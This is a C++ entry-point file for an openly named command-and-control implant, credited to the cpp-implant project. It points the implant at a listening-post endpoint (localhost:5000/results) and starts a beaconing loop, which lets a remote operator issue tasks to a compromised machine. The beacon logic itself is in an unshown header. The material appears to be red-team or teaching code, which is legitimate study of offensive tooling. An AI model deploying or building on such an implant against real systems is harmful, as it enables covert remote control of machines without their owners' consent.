// main.cpp
/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * The original author of this code is Josh Lospinoso (@jalospinoso).
 * The unmodified source code can be found here: https://github.com/JLospinoso/cpp-implant
*/
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"

#include <stdio.h>

#include <boost/system/system_error.hpp>


int main()
{
    // Specify address, port and URI of listening post endpoint
    const auto host = "localhost";
    const auto port = "5000";
    const auto uri = "/results";
    // Instantiate our implant object
    Implant implant{ host, port, uri };
    // Call the beacon method to start beaconing loop
    try {
        implant.beacon();
    }
    catch (const boost::system::system_error& se) {
        printf("\nSystem error: %s\n", se.what());
    }
}
